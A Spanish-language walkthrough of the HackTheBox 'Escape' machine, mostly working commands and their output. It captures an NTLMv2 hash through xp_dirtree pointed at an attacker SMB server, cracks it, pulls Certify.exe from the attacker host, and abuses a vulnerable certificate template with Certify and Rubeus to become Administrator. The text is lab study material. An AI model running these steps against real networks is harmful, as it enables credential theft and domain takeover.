---
title: Escape WriteUp
author: H4ckerLite 
date: 2023-04-03 00:00:00 +0800
categories: [hackthebox, machine, writeup]
tags: [windows, hackthebox, writeup, medium, certify, rubeus, DC, smbclient, evil-winrm]
image:
  path: ../../assets/img/commons/escape-writeup/Escape.png 
  alt: Inject WriteUp
pin: true
---

Máquinita Windows de [HackTheBox](https://app.hackthebox.com/machines/531), es de dificultad media. Ganarameos acceso al servicio `MSSQL` tramitando una petición a un servidor nuestro `SMB` obtendremos el hash `NTLMv2` de un usuario, nos conectamos por `Evil-Winrm` y mediante una contraseña lekeada vemos la contraseña de otro usuario, Para la esclada nos apovecharemos de un certificado vulnerable que nos dará el hash `NTLM`del usuario `Administrator`.

## Enumeración
### Escaneo de puertos

Si realizamos un NMAP Scan, veremos los siguientes puertos.

```bash
❯❯ nmap 10.10.11.202
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 20:37 -04
Nmap scan report for sequel.htb (10.10.11.202)
Host is up (0.16s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

Nmap done: 1 IP address (1 host up) scanned in 26.54 seconds
```

Los puertos **53** y **88**  los que nos da a entender que es un dominio. 

Si realizamos un escaneo más profundo vemos.

```bash
❯ nmap 10.10.11.202 -sCV -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 20:40 -04
Nmap scan report for sequel.htb (10.10.11.202)
Host is up (0.16s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-04 08:41:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-04-04T08:42:23+00:00; +7h59m57s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-04-04T08:42:24+00:00; +7h59m57s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-04-04T08:42:23+00:00; +7h59m57s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-04-04T00:27:54
|_Not valid after:  2053-04-04T00:27:54
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-04T08:42:23+00:00; +7h59m57s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-04-04T08:42:23+00:00; +7h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m57s, deviation: 0s, median: 7h59m56s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-04-04T08:41:45
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.34 seconds
```

Aadimos los domonios al etc/hosts
```bash
echo '10.10.11.202      sequel.htb dc.sequel.htb' | tee -a /etc/hosts
```

Si enumeramos con SMBCLIENT vemos lo siguiente.

```bash
❯ smbclient -L 10.10.11.202 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Public          Disk      
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```
- -L significa que queremos listar los archivos compartidos a nivel de sistema.
- -N que queremos ver si está habilitada una Null Sesion.

Como vemos el recurso `Public`procedemos a ver su contenido.

```bash
❯ smbclient //10.10.11.202/Public  -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 07:51:25 2022
  ..                                  D        0  Sat Nov 19 07:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 09:39:43 2022

		5184255 blocks of size 4096. 1455347 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (49,5 KiloBytes/sec) (average 49,5 KiloBytes/sec)
smb: \> 

```

Si lo abrimos en nuestro navegador, veremos lo siguiente:

![Hacker ]({{ 'assets/img/commons/escape-writeup/2.png' | relative_url }}){: .center-image }
_PDF_

![Hacker ]({{ 'assets/img/commons/escape-writeup/3.png' | relative_url }}){: .center-image }
_PDF_

Si observamos se lekea un usuario y su contraseña del servicio MSSQL. Nos podemos conectar.
```bash
❯ impacket-mssqlclient sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```

## Intrusión
Nos creamos un servidor SMB y le damos soporte para `SMBv2`

```bash
❯ impacket-smbserver pwned  . -smb2support
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Usando `xp_dirtree` realizamos una petición a nuestro servidor para capturar el hash `NTLMv2`.
```bash
SQL> xp_dirtree '\\10.10.14.15\pwned'
subdirectory                                                                                                                                                                                                                                                      depth   
```

```bash
❯ impacket-smbserver pwned  . -smb2support
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.202,65510)
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
[*] User DC\sql_svc authenticated successfully
[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:314ff337fa86f59b92de0736deb4049c:010100000000000080000d6d9166d901c8ab9cfbb6ab467600000000010010006d006a00500063004c00410049005900030010006d006a00500063004c0041004900590002001000780067006500580056004d007a00740004001000780067006500580056004d007a0074000700080080000d6d9166d90106000400020000000800300030000000000000000000000000300000119db20e63db55f605fba008935acc2ecdc9bceb177eedfc45245d776a2b79350a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310035000000000000000000
[*] Closing down connection (10.10.11.202,65510)
[*] Remaining connections []
```
Mediante Crack de Hash, obtenemos la contraseña.
```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)
1g 0:00:00:07 DONE (2023-04-03 21:07) 0.1303g/s 1395Kp/s 1395Kc/s 1395KC/s RENZOJAVIER..REDMAN69
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
Usando `rpcclient` podemos enumerar usuarios del dominio.
```bash
❯ rpcclient -U 'sql_svc' 10.10.11.202
Password for [WORKGROUP\sql_svc]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Tom.Henn] rid:[0x44f]
user:[Brandon.Brown] rid:[0x450]
user:[Ryan.Cooper] rid:[0x451]
user:[sql_svc] rid:[0x452]
user:[James.Roberts] rid:[0x453]
user:[Nicole.Thompson] rid:[0x454]
rpcclient $> 
```

Nos conectamos mediante `Evil-WinRm`.
```bash
❯ evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents> 
```
Si vamos a la raíz de C:, vemos......

*Evil-WinRM* PS C:\Users\sql_svc\Documents> cd ../../../
*Evil-WinRM* PS C:\> dir


    Directory: C:\

```
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer
d-r---         2/1/2023   1:55 PM                Users
d-----         4/3/2023  10:34 PM                Windows


*Evil-WinRM* PS C:\> 
```
Una carpeta llamada `SQLServer` y otra `Logs`.
```bash
*Evil-WinRM* PS C:\SQLServer\Logs> dir


    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK


*Evil-WinRM* PS C:\SQLServer\Logs> 
```
Vemos que tenemos otro usuario y su contraseña.
![Hacker ]({{ 'assets/img/commons/escape-writeup/4.png' | relative_url }}){: .center-image }
_ERROLOG.BAK_


Nos conectamos.
```bash
❯ evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p NuclearMosquito3

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```
Procedemos a leer la primera flag.
```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> type ../Desktop/user.txt
12****************************a6
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```
![Hacker ]({{ 'assets/img/commons/escape-writeup/gato.gif' | relative_url }}){: .center-image }
_Pwned_

## Escalada de Privilegios
Importamos y ejecutamos `Certify.exe` para descubrir plantillas de certificados vulnerables. Todo lo descargaremos de este repositorio de [GitHub](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries).
```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> wget http://10.10.14.15/Certify.exe -o Certify.exe
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe find /vulnerable /currentuser

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using current user's unrolled group SIDs for vulnerability checks.
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.0967993
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 

```
Usando esta [guía](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin).
```bash
certify.exe request /ca:<$certificateAuthorityHost> /template:<$vulnerableCertificateTemplateName> /altname:<$adUserToImpersonate>
```
- /ca - Especificamos el servidor de la Autoridad de Certificación al que enviamos la solicitud;
- /template - Especificamos la plantilla de certificado que debe utilizarse para generar el nuevo certificado;
- /altname - Especificamos el usuario AD para el que debe generarse el nuevo certificado.
```

```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 15

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAuQ0JwtjXqi8KxN4BpNub59Zm/VWwObmc7Fl81iWzpJR83hJf
oPJw5NeORh91QJ+mlu1jxUg0J291PAYFgvTnBu/FqxkB3bhzEYlZTHSp5ds5WqR3
jSlFOhVEE0UyAcmxBhxzZWGIvem/I3an3g23n02CQenEOTxlNlnYX0bZcYwbs/ao
DUak9oZxTDNk4mbp3H7jcdjnw29NnjCIbuq/2tocbL98p4Wn+9YHkmOMmUk38Wqg
2YQjbC60KBj9Ww+D1a8yNHyLXP3e7loC6zi7XUGjZeNhWb5x9yHXeFiGvsHvl9Ik
/6mqFa1yoclEPS696e74nqOTEyVXMQRkpKYiHQIDAQABAoIBAQCCkzSkDKaBK5iJ
ua2nSl8EhEE/2Ur0MIkOLUbtRMUyCKTjfkuEIg6PK5r02BXAd+bw8KlJ99z1RqyO
oiEZev3Z4y6zwH2UmiZ35VbhoCCSVNJvp0XEka6LgZ37iwPyRwNmsISssNnwSBPb
Tkq9YSiEfAjBwdX4HSm95D/NWwzsFSDxRJviQgwL5VOObtqmkaN3l96x2r1euL5d
5YYtnOvgZnnAjHTMG0KVSnQRXJvyoMDptGi5Tk6xRGj+rlLjVZv+D/zbg4Q0smWW
xHmTimYUm8nxDtO0G0Lakg31iKM9l8SHdDUoWexObVUhRjLePnMubjht8/W+Gr8M
7c/1QLTxAoGBAOxfL9gOT72pJ7Vytr1s0HUJgZ4rqFzDyAcFweOSbPY3VHsO2Swe
H+y4LEXKbva6PoasorF/jMCAW3aBARlyz7ge3I1MI+Q3bGp625lkRQ6IQsDhJLgq
jRRMVVEAkQSmPaDYji70jbtEKOA5WBeFPrNyPBfxNk6APfzg9KkFVEdnAoGBAMhq
3f2Bxu2aMzmadBQhnkip1BI5XFMlFhNL8w+p67ixFTfs3hHeI9FcQjqeY3ND7FvI
D92PjwvxuGP3QZmKW76VvZ0pAMRrTjb/Kbvg4FtqirqALdEMY51zxHv5ZHqCp9ux
u1U2cuiYHPF0iT5onNcXCPSVWtL3efU61+Heg2vbAoGBAND+ULU94i+V0vBSH1VZ
Uu9ImnyZqWFsEf5zjr2CiCkjPuUXednSQPPy2+JRXM92WTaGictbNb43P6eF5Mz1
gMgRMX0VZ16vyoJTYrs7tvtka3FTID5eESNzYrQeRhrQSglfsEfAH1kGqQWobkVN
oOTVCmE4+4VpSmW/GVQgzCXdAoGACvm3QHvL7hUkuwHXW4bfyTDruTfE85SzWckt
/WybyRiBhfeFzcqxgXSg997WqWhN2FTjcYm8FrZdF7RhtkvabFx87s9hCGCr/t0I
Zw6QmtEB2ebNG4anKec+Gl/0/bSMBr77+FWsA0rZQuvT3EQUWr8bMXHAcI828ZQQ
YIE0B0MCgYBMNfQ+9fiFnWALqU73ehVc0kPvJznmSXX0Z+XIHjbqpzQs9bQ7h6Wq
HNzaZVaueOrv9QJ+TvEKAfkUbbpoV+v2OwVckjqGCwf5SbkhHfx1j4tYNRauH7Hf
2r23b/ZRy23efeU/ZYZs2YY71K6fURET7hrgFG020HRn+NxGJHEA5g==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAA/pJjUBjj+lpAAAAAAADzANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwNDA0MDk0MzExWhcNMjUwNDA0
MDk1MzExWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC5DQnC2NeqLwrE3gGk25vn1mb9
VbA5uZzsWXzWJbOklHzeEl+g8nDk145GH3VAn6aW7WPFSDQnb3U8BgWC9OcG78Wr
GQHduHMRiVlMdKnl2zlapHeNKUU6FUQTRTIBybEGHHNlYYi96b8jdqfeDbefTYJB
6cQ5PGU2WdhfRtlxjBuz9qgNRqT2hnFMM2TiZuncfuNx2OfDb02eMIhu6r/a2hxs
v3ynhaf71geSY4yZSTfxaqDZhCNsLrQoGP1bD4PVrzI0fItc/d7uWgLrOLtdQaNl
42FZvnH3Idd4WIa+we+X0iT/qaoVrXKhyUQ9Lr3p7vieo5MTJVcxBGSkpiIdAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFBLtgmmZo1k7Vpapf/zHk2aOicxU
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAO1EjXikuDc35DAjKsZPszKi6Aq1dS85i+cbbrNwOK99g8fiYnDnIdOaH
dpKDSeVGF6K9rKs6/b0J8qHKBlj8NEBpji/wacbxz4+Nlg5lfPS02S1t/IqmaIo3
HiXPxjNa0epM3EQ0/g8eBrYdmfXGjNelv5o8vaaiOOrdymiHssm4h5gvQADkbOsE
9YQGfV0Hknk6S/L1bJq+1PDGoMIShwLwt202CwgkCJ/0+PXbGzzcvzfnH8/3cBMt
GfjJ2Oqm6/8/NoYJkI5gpqUQsu9fFji07S5NPeXPpcHp53j5A6mM07FYCNFOXIkH
GcaAgmGkMVGWaw90STHR07EW6q5vfg==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:12.8384593
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> 
```
En nuestro Linux guardamos la información en un archivo llamado `cert.perm` y hacemos lo siguiente.
```bash
❯ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Enter Export Password:
Verifying - Enter Export Password:
```

Descargamos el archivo y el binario de Rubeus.
```bash
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::ac1b:a74a:c865:d5a0%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
